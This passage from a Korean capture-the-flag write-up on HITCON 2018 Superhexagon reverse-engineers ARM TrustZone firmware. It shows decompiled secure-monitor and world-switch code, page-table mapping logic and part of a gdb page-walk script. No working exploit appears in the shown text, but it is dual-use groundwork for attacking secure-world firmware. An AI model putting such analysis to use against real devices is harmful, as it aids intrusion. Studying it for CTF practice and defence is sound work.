</span></span><span style="display:flex;"><span>     fffc0008200 <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">60</span>  b0  f2    movk       x0,<span style="color:#960050;background-color:#1e0010">#</span><span style="color:#ae81ff">0x8300</span> , LSL <span style="color:#960050;background-color:#1e0010">#</span><span style="color:#ae81ff">16</span>
</span></span><span style="display:flex;"><span>     fffc0008204 d8  <span style="color:#ae81ff">03</span>  <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">94</span>    bl         secure_monitor_call                              undefined <span style="color:#a6e22e">secure_monitor_call</span>()
</span></span><span style="display:flex;"><span>     fffc0008208 fd  <span style="color:#ae81ff">7</span>b  c1  a8    ldp        x29 <span style="color:#f92672">=&gt;</span>local_10 ,x30 ,[sp], <span style="color:#960050;background-color:#1e0010">#</span><span style="color:#ae81ff">0x10</span>
</span></span><span style="display:flex;"><span>     fffc000820c c0  <span style="color:#ae81ff">03</span>  <span style="color:#ae81ff">5f</span>  d6    ret
</span></span></code></pre></div><p>이렇게 부른다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">bool</span> <span style="color:#a6e22e">FUN_0000025c</span>(<span style="color:#66d9ef">void</span>)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">bool</span> bVar1;
</span></span><span style="display:flex;"><span>  ulong uVar2;
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>  uVar2 <span style="color:#f92672">=</span> <span style="color:#a6e22e">ret_0</span>();
</span></span><span style="display:flex;"><span>  bVar1 <span style="color:#f92672">=</span> DAT_0e000008 <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (bVar1) {
</span></span><span style="display:flex;"><span>    normal_ctx._536_4_ <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">FUN_00000120</span>(<span style="color:#ae81ff">0xe000000</span>,<span style="color:#ae81ff">1</span>,DAT_0e000008,<span style="color:#ae81ff">0xe400000</span>,<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">2</span>,(uVar2 <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xffffffff</span>) <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x220</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0xe002430</span>);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#f92672">!</span>bVar1;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>0xe000000가 보이는거 보니 boot argument 같은 것으로 보인다.
BL1에서 0x68 만큼 copy한 데이터에 속한다.
<img loading="lazy" src="/blog/Hitcon_2018_Superhexagon/577f1089824846bcb526437568648b71.png" alt=""  />
</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">FUN_00000120</span>(undefined <span style="color:#f92672">*</span>param_1,<span style="color:#66d9ef">int</span> param_2,undefined8 param_3,undefined8 param_4,
</span></span><span style="display:flex;"><span>                 undefined8 param_5,undefined8 param_6,undefined4 <span style="color:#f92672">*</span>param_7)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  undefined8 uVar1;
</span></span><span style="display:flex;"><span>  undefined4 uVar2;
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>  uVar1 <span style="color:#f92672">=</span> mpidr_el1;
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">*</span>(undefined8 <span style="color:#f92672">*</span>)(param_7 <span style="color:#f92672">+</span> <span style="color:#ae81ff">2</span>) <span style="color:#f92672">=</span> uVar1;
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">*</span>param_7 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">FUN_000008ac</span>(param_7 <span style="color:#f92672">+</span> <span style="color:#ae81ff">8</span>,<span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>  uVar1 <span style="color:#f92672">=</span> sctlr_el3;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (((uint)uVar1 <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">0x19</span> <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>    uVar2 <span style="color:#f92672">=</span> <span style="color:#ae81ff">4</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>    uVar2 <span style="color:#f92672">=</span> <span style="color:#ae81ff">6</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">*</span>param_1 <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>  param_1[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">*</span>(undefined2 <span style="color:#f92672">*</span>)(param_1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">2</span>) <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x58</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">*</span>(undefined4 <span style="color:#f92672">*</span>)(param_1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">4</span>) <span style="color:#f92672">=</span> uVar2;
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">*</span>(undefined8 <span style="color:#f92672">*</span>)(param_1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">8</span>) <span style="color:#f92672">=</span> param_3;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (param_2 <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>(undefined4 <span style="color:#f92672">*</span>)(param_1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x10</span>) <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x3c5</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>(undefined4 <span style="color:#f92672">*</span>)(param_1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x10</span>) <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x1d3</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">print_log</span>(<span style="color:#a6e22e">s_</span>(_TEE_PC:_<span style="color:#f92672">%</span>lx_000018d0,param_3);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">print_log</span>(<span style="color:#a6e22e">s_</span>(_TEE_SPSR:_<span style="color:#f92672">%</span>x_000018e0,<span style="color:#f92672">*</span>(undefined4 <span style="color:#f92672">*</span>)(param_1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x10</span>));
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">set_zero</span>(param_1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x18</span>,(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#ae81ff">0x40</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">*</span>(undefined8 <span style="color:#f92672">*</span>)(param_1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x18</span>) <span style="color:#f92672">=</span> param_4;
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">*</span>(undefined8 <span style="color:#f92672">*</span>)(param_1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x20</span>) <span style="color:#f92672">=</span> param_5;
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">*</span>(undefined8 <span style="color:#f92672">*</span>)(param_1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x28</span>) <span style="color:#f92672">=</span> param_6;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>위와 같이 초기화해준다.
log print 과정에서 PC와 SPSR을 식별할 수 있다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">FUN_000009a0</span>(world_ctx <span style="color:#f92672">*</span>secure_context,<span style="color:#66d9ef">long</span> param_2)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  uint uVar1;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">long</span> lVar2;
</span></span><span style="display:flex;"><span>  undefined8 uVar3;
</span></span><span style="display:flex;"><span>  uint uVar4;
</span></span><span style="display:flex;"><span>  uint new_SCR;
</span></span><span style="display:flex;"><span>  uint ns;
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>  ns <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(uint <span style="color:#f92672">*</span>)(param_2 <span style="color:#f92672">+</span> <span style="color:#ae81ff">4</span>) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">set_zero</span>((<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)secure_context,(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#ae81ff">0x200</span>);
</span></span><span style="display:flex;"><span>  uVar3 <span style="color:#f92672">=</span> scr_el3;
</span></span><span style="display:flex;"><span>  new_SCR <span style="color:#f92672">=</span> (uint)uVar3 <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xfffff2f8</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (ns <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>    new_SCR <span style="color:#f92672">=</span> new_SCR <span style="color:#f92672">|</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  uVar1 <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(uint <span style="color:#f92672">*</span>)(param_2 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x10</span>);
</span></span><span style="display:flex;"><span>  uVar4 <span style="color:#f92672">=</span> uVar1 <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">4</span> <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (uVar4 <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>    new_SCR <span style="color:#f92672">=</span> new_SCR <span style="color:#f92672">|</span> <span style="color:#ae81ff">0x400</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ((<span style="color:#f92672">*</span>(uint <span style="color:#f92672">*</span>)(param_2 <span style="color:#f92672">+</span> <span style="color:#ae81ff">4</span>) <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">2</span> <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>    new_SCR <span style="color:#f92672">=</span> new_SCR <span style="color:#f92672">|</span> <span style="color:#ae81ff">0x800</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  new_SCR <span style="color:#f92672">=</span> new_SCR <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xfffffff7</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (((uVar4 <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) <span style="color:#f92672">&amp;&amp;</span> ((uVar1 <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">2</span> <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">3</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">2</span>)) <span style="color:#f92672">||</span> ((uVar4 <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">&amp;&amp;</span> ((uVar1 <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xf</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">10</span>)))) {
</span></span><span style="display:flex;"><span>    new_SCR <span style="color:#f92672">=</span> new_SCR <span style="color:#f92672">|</span> <span style="color:#ae81ff">0x100</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (uVar4 <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>    uVar1 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x30d00800</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>    uVar1 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xc50838</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  (secure_context<span style="color:#f92672">-&gt;</span>sysregs).SCTLR_EL1 <span style="color:#f92672">=</span> (ulong)((<span style="color:#f92672">*</span>(uint <span style="color:#f92672">*</span>)(param_2 <span style="color:#f92672">+</span> <span style="color:#ae81ff">4</span>) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">2</span>) <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">0x18</span> <span style="color:#f92672">|</span> uVar1);
</span></span><span style="display:flex;"><span>  lVar2 <span style="color:#f92672">=</span> actlr_el1;
</span></span><span style="display:flex;"><span>  (secure_context<span style="color:#f92672">-&gt;</span>sysregs).ACTLR_EL1 <span style="color:#f92672">=</span> lVar2;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (ns <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>    (secure_context<span style="color:#f92672">-&gt;</span>sysregs).PMCR_EL0 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x60</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>                    <span style="color:#75715e">/* SCR_EL3.NS = 0 */</span>
</span></span><span style="display:flex;"><span>  secure_context<span style="color:#f92672">-&gt;</span>scr_el3 <span style="color:#f92672">=</span> (ulong)new_SCR;
</span></span><span style="display:flex;"><span>  secure_context<span style="color:#f92672">-&gt;</span>pc <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(<span style="color:#66d9ef">uint64_t</span> <span style="color:#f92672">*</span>)(param_2 <span style="color:#f92672">+</span> <span style="color:#ae81ff">8</span>);
</span></span><span style="display:flex;"><span>  secure_context<span style="color:#f92672">-&gt;</span>spsr <span style="color:#f92672">=</span> (ulong)<span style="color:#f92672">*</span>(uint <span style="color:#f92672">*</span>)(param_2 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x10</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">FUN_0000116c</span>(secure_context,param_2 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x18</span>,<span style="color:#ae81ff">0x40</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>위와 같이 secure context를 세팅한다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">FUN_000001f8</span>(<span style="color:#66d9ef">long</span> param_1)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">restore_sysregs</span>(<span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">set_spelx</span>(<span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">FUN_00000c90</span>(param_1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x10</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>FUN_00000c90 내부적으로 시스템 레지스터 세팅하고 eret한다.
대충 어떤식으로 world switch가 일어나고 어디를 분석해야할지 알게 되었다.</p>
<h2 id="secure-world-pagewalk-gdbscript">Secure world pagewalk gdbscript<a hidden class="anchor" aria-hidden="true" href="#secure-world-pagewalk-gdbscript">#</a></h2>
<p>qemu에서 system registers를 보여주는데 오류가 있어서 직접 pagewalk를 하는 스크립트를 따로 작성했다.
<img loading="lazy" src="/blog/Hitcon_2018_Superhexagon/669376547659f5485e8f9dd5bde3f8cb.png" alt=""  />

<img loading="lazy" src="/blog/Hitcon_2018_Superhexagon/4c79781ac982b5ca8673dc31740d6f9e.png" alt=""  />

메뉴얼은 적당히 보고 넘기면서 구현했다.
위 AP[2:1] 모델을 보고 권한을 맞췄다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>undefined4 <span style="color:#a6e22e">FUN_080001e8</span>(uint addr,uint phys_addr,uint param_3)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  uint uVar1;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> iVar2;
</span></span><span style="display:flex;"><span>  uint lvl1_idx;
</span></span><span style="display:flex;"><span>  uint local_30;
</span></span><span style="display:flex;"><span>  uint uStack_2c;
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>  local_30 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x60f</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ((param_3 <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">2</span>) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>    local_30 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x64f</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ((param_3 <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>    local_30 <span style="color:#f92672">=</span> local_30 <span style="color:#f92672">|</span> <span style="color:#ae81ff">0x80</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  uStack_2c <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ((param_3 <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">4</span>) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>    uStack_2c <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x400000</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ((param_3 <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">8</span>) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>    uStack_2c <span style="color:#f92672">=</span> uStack_2c <span style="color:#f92672">|</span> <span style="color:#ae81ff">0x200000</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ((param_3 <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0x10</span>) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>    local_30 <span style="color:#f92672">=</span> local_30 <span style="color:#f92672">|</span> <span style="color:#ae81ff">0x20</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  lvl1_idx <span style="color:#f92672">=</span> addr <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">21</span> <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0x7f</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ((<span style="color:#f92672">*</span>(uint <span style="color:#f92672">*</span>)(<span style="color:#f92672">&amp;</span>trans_table_lvl1 <span style="color:#f92672">+</span> lvl1_idx <span style="color:#f92672">*</span> <span style="color:#ae81ff">8</span>) <span style="color:#f92672">|</span> <span style="color:#f92672">*</span>(uint <span style="color:#f92672">*</span>)(lvl1_idx <span style="color:#f92672">*</span> <span style="color:#ae81ff">8</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x8004004</span>)) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>    uVar1 <span style="color:#f92672">=</span> <span style="color:#a6e22e">FUN_0800019c</span>(<span style="color:#f92672">&amp;</span>trans_table_lvl2 <span style="color:#f92672">+</span> lvl1_idx <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x1000</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>(uint <span style="color:#f92672">*</span>)(<span style="color:#f92672">&amp;</span>trans_table_lvl1 <span style="color:#f92672">+</span> lvl1_idx <span style="color:#f92672">*</span> <span style="color:#ae81ff">8</span>) <span style="color:#f92672">=</span> uVar1 <span style="color:#f92672">|</span> <span style="color:#ae81ff">3</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">FUN_08001944</span>(<span style="color:#f92672">&amp;</span>trans_table_lvl2 <span style="color:#f92672">+</span> lvl1_idx <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x1000</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0x1000</span>);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  iVar2 <span style="color:#f92672">=</span> ((addr <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">0xc</span> <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0x1ff</span>) <span style="color:#f92672">+</span> lvl1_idx <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x200</span>) <span style="color:#f92672">*</span> <span style="color:#ae81ff">8</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">*</span>(uint <span style="color:#f92672">*</span>)(<span style="color:#f92672">&amp;</span>trans_table_lvl2 <span style="color:#f92672">+</span> iVar2) <span style="color:#f92672">=</span> local_30 <span style="color:#f92672">|</span> phys_addr;
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">*</span>(uint <span style="color:#f92672">*</span>)(iVar2 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x8005004</span>) <span style="color:#f92672">=</span> uStack_2c;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>읽었던 메뉴얼이랑 세부 사항이 다른 것같아서 리버싱한 결과대로 구현했다.
빠르게 구현하는데 초점을 맞춰서 구현이 제대로 되었는지는 잘 모르겠다.
기존에 미리 작성했던 secure world의 물리 메모리를 읽는 스크립트를 이용해서 구현했다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>import gdb
</span></span><span style="display:flex;"><span>TTBR0_EL1 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xe404000</span>
</span></span><span style="display:flex;"><span>gdb.<span style="color:#a6e22e">execute</span>(<span style="color:#960050;background-color:#1e0010">&#39;</span>source .<span style="color:#f92672">/</span>gdbscript.py<span style="color:#960050;background-color:#1e0010">&#39;</span>)
</span></span><span style="display:flex;"><span>res <span style="color:#f92672">=</span> gdb.<span style="color:#a6e22e">execute</span>(f<span style="color:#960050;background-color:#1e0010">&#39;</span>qemu_support read_phys {TTBR0_EL1} <span style="color:#ae81ff">512</span><span style="color:#960050;background-color:#1e0010">&#39;</span>,to_string<span style="color:#f92672">=</span>True)
</span></span><span style="display:flex;"><span>res <span style="color:#f92672">=</span> res.<span style="color:#a6e22e">split</span>(<span style="color:#e6db74">&#39;\n&#39;</span>)[<span style="color:#f92672">:-</span><span style="color:#ae81ff">1</span>]
</span></span><span style="display:flex;"><span>next_table <span style="color:#f92672">=</span> []
</span></span><span style="display:flex;"><span>next_table_idx <span style="color:#f92672">=</span> []
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> idx, line in <span style="color:#a6e22e">enumerate</span>(res)<span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>    l <span style="color:#f92672">=</span> (line.<span style="color:#a6e22e">split</span>())
</span></span><span style="display:flex;"><span>    v0, v1 <span style="color:#f92672">=</span> <span style="color:#66d9ef">int</span>(l[<span style="color:#ae81ff">1</span>],<span style="color:#ae81ff">16</span>), <span style="color:#66d9ef">int</span>(l[<span style="color:#ae81ff">2</span>],<span style="color:#ae81ff">16</span>) 
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> v0 <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0</span>b11: <span style="color:#960050;background-color:#1e0010">#</span> exists
</span></span><span style="display:flex;"><span>        next_table.<span style="color:#a6e22e">append</span>(v0)
</span></span><span style="display:flex;"><span>        next_table_idx.<span style="color:#a6e22e">append</span>(idx<span style="color:#f92672">*</span><span style="color:#ae81ff">2</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> v1 <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0</span>b11: 
</span></span><span style="display:flex;"><span>        next_table.<span style="color:#a6e22e">append</span>(v1)
</span></span><span style="display:flex;"><span>        next_table_idx.<span style="color:#a6e22e">append</span>(idx<span style="color:#f92672">*</span><span style="color:#ae81ff">2</span><span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> idx,i in <span style="color:#a6e22e">enumerate</span>(next_table)<span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>    res <span style="color:#f92672">=</span> gdb.<span style="color:#a6e22e">execute</span>(f<span style="color:#960050;background-color:#1e0010">&#39;</span>qemu_support read_phys {(i<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">10</span>)<span style="color:#f92672">&lt;&lt;</span><span style="color:#ae81ff">10</span>} <span style="color:#ae81ff">512</span><span style="color:#960050;background-color:#1e0010">&#39;</span>,to_string<span style="color:#f92672">=</span>True)
</span></span><span style="display:flex;"><span>    res <span style="color:#f92672">=</span> res.<span style="color:#a6e22e">split</span>(<span style="color:#e6db74">&#39;\n&#39;</span>)[<span style="color:#f92672">:-</span><span style="color:#ae81ff">1</span>]
</span></span><span style="display:flex;"><span>    def <span style="color:#a6e22e">f</span>(v)<span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>        E <span style="color:#f92672">=</span> <span style="color:#960050;background-color:#1e0010">&#39;&#39;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (v<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">53</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">1</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>            E <span style="color:#f92672">+=</span> <span style="color:#960050;background-color:#1e0010">&#39;</span>PXN <span style="color:#960050;background-color:#1e0010">&#39;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (v<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">54</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">1</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>            E <span style="color:#f92672">+=</span> <span style="color:#960050;background-color:#1e0010">&#39;</span>XN <span style="color:#960050;background-color:#1e0010">&#39;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (v<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">5</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">1</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>            E <span style="color:#f92672">+=</span> <span style="color:#960050;background-color:#1e0010">&#39;</span>NS <span style="color:#960050;background-color:#1e0010">&#39;</span>
</span></span><span style="display:flex;"><span>        AP <span style="color:#f92672">=</span> (v <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">6</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">3</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> AP <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>b00:
</span></span><span style="display:flex;"><span>            E <span style="color:#f92672">+=</span> <span style="color:#960050;background-color:#1e0010">&#39;</span>PL1 Read<span style="color:#f92672">/</span>Write PL0 No<span style="color:#f92672">-</span>Access <span style="color:#960050;background-color:#1e0010">&#39;</span>
